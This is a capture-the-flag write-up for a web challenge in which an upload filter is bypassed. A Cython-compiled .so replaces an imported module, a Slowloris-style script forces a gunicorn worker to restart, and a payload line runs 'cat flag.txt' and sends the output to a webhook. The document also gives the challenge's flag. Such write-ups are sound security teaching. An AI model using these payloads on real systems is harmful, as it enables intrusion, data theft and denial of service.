# Dirty Generator

## Category
Web

## Estimated difficulty
Extreme

## Description
A Python-based file upload service generates a QR code for each uploaded file without modifying its content. Uploads are restricted to filenames with only alphabetic characters, a single dot (`.`), and no `.py` or `.pyc` extensions.
The challenge can be solved by uploading a malicious Python payload disguised as a `.so` file, then triggering the server to load and execute it, resulting in flag exfiltration.

## Scenario
Hey! Did you see my new file upload and QR code generator ? It was soooo easy to vibecode it.

## Write-up
The contestant is provided with a simple instance with a single page and ... nothing more.

### Reconnaissance
The application provides a file upload feature that restricts filenames to alphabetic characters with at most one dot (`.`), suggesting validation is based on the filename rather than file content.

- After uploading a file, the server returns a QR code containing: `The SHA256 checksum of your file is: <sha256>` - Upon verification, the sha256 indeed comes from the uploaded file
- A note is present stating *"Most file types accepted"*, suggesting certain extensions are blocked.
- A response header we are getting from the server is leaking environment details: `Server: gunicorn/25.1.0 Python/3.12.12 myqrcode/1.0.0`
	- `gunicorn/25.1.0` indicates the web server in use
	- `Python/3.12.12` discloses the python version
	- `myqrcode/1.0.0` appears to be a custom library
- The `robots.txt` contains `Disallow: flag.txt`, hinting that the flag is located at the application root. However, directly accessing `/flag.txt` does not return any useful data.

### Fuzzing file types
The next logical step is to identify which file types are explicitly restricted, as the application hints that ***most*** types are accepted. Testing various filenames reveals:
- Uploading `flag.txt`: `You cannot overwrite flag.txt.`
- Uploading `.py` or `.pyc` files: `You cannot upload python files`
- Uploading `app.py`: `You cannot overwrite app.py.`
- Uploading `myqrcode.py`: `You cannot overwrite myqrcode.py.`

From these findings, we can infer that our goal is to upload a *valid python executable file*. But how to do that if `.py` and `.pyc` files are restricted?

The server discloses it is running `gunicorn` with Python. Since Gunicorn is commonly used to serve WSGI applications (typically Flask or similar frameworks), it is reasonable to assume the presence of a main application file (ie: `app.py`) importing internal modules.

The reference to `myqrcode` in the server header, strongly suggests that this module is imported by the application to handle QR code generation (likely via a standard `import myqrcode` or `from myqrcode import *` statement).

This opens the door to an import-based attack: if we can place a malicious file that gets interpreted as a Python module during import, we may achieve code execution despite the `.py`/`.pyc` restrictions.

## Share Object to the rescue!
In Python, `.py` and `.pyc` are not the only importable file types. Compiled extension modules such as `.so` files (or `.pyd` for Windows) are also valid, provided they are built for the correct Python version.

This makes it possible to bypass the extension filter by writing a Python payload and compiling it into a `.so` using **Cython**. Since the server runs `Python/3.12.12`, the compiled module must target this exact version.

The following payload reads the flag and exfiltrates it to an external endpoint:
```py
__import__('requests').get('HOOK', params={'flag': __import__('subprocess').check_output('cat flag.txt', shell=True).decode().strip()})
```
Replace `HOOK` with a webhook endpoint (ie: Burp Collaborator). Alternatively, exfiltration could be achieved by writing into a file served by the application (such as a `templates/index.html`).

To compile this into a valid `.so`, we use a Docker container to ensure compatibility with the target Python version. **NOTE:** The filename is critical because Python resolves imports based on module names, and this name is also embedded internally during compilation. With Cython, the module name is derived from the original source filename at build time. For instance, compiling `hello.py` produces a module internally named `hello`. Simply renaming the resulting `hello.so` to `myqrcode.so` will not work, as Python will fail to import it due to the mismatch (ie: missing `PyInit_myqrcode` symbol).
```Dockerfile
FROM python:3.12-slim

RUN pip install cython setuptools && apt-get update && apt-get install -y gcc

WORKDIR /build

COPY myqrcode.py .

RUN cythonize -i myqrcode.py && mv myqrcode.cpython-*.so myqrcode.so
```

Build and extract the compiled module:
```sh
sudo docker build --no-cache -t myqrcode-build .
sudo docker run --rm -v $(pwd):/out myqrcode-build cp /build/myqrcode.so /out/myqrcode.so
```

The resulting `myqrcode.so` can now be uploaded to the server to replace the imported module and achieve code execution.

## Loading the file
After uploading our malicious `myqrcode.so`, it is present on the server. However, this alone is not enough. The application has already executed `import myqrcode` when the worker started, meaning the original module is already loaded in memory. This prevents our malicious `.so` from being executed immediately.

To trigger our payload, we need the application to **restart** or **reload**, forcing Python to `import myqrcode` again which will reload the file from disk.

We know that the webserver is using `gunicorn`. In specific scenarios (no proxy), the webserver is [vulnerable to DoS attack](https://gunicorn.org/deploy/). By creating a slow connection to the server, it is possible to trigger the default worker timeout of `gunicorn` (30 seconds). When a worker becomes unresponsive for too long, Gunicorn will kill and restart it which effectively reloads the code and execute our code.

The following script performs a simple [Slowloris-style](https://en.wikipedia.org/wiki/Slowloris_(cyber_attack)) request attack to freeze a worker:
```py
#!/usr/bin/env python3
import socket, threading, time

HOST = "<HOST>"
PORT = 8080
BASE_URL = f"http://{HOST}:{PORT}"
GUNICORN_TIMEOUT = 35

def freeze_worker():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.send(b"GET / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n")
    time.sleep(GUNICORN_TIMEOUT + 5)
    s.close()

def main():
    print("[*] Freezing worker...")
    threading.Thread(target=freeze_worker, daemon=True).start()

    print(f"[*] Check your webhook in ~{GUNICORN_TIMEOUT}s")
    time.sleep(GUNICORN_TIMEOUT + 5)
    print(f"[*] Check your webhook now")

if __name__ == "__main__":
    main()
```

Once the worker is restarted, the application reloads and executes our malicious module. The flag is then exfiltrated to the configured webhook:
```
https://<redacted>.m.pipedream.net/?flag=CSC%7Bim_r34lly_1mpr3ssed%21_y0u_d1d_it_dirty%3F%21_03e97a90baf03e2c%7D
```

## Flag
`CSC{im_r34lly_1mpr3ssed!_y0u_d1d_it_dirty?!_03e97a90baf03e2c}`

## Creator
Maximilien Laenen

## Creator bio
Former CSCBE participant, mainly interested in mobile applications and reverse engineering. I hope you will ~~hate~~ like my challenges! 👀
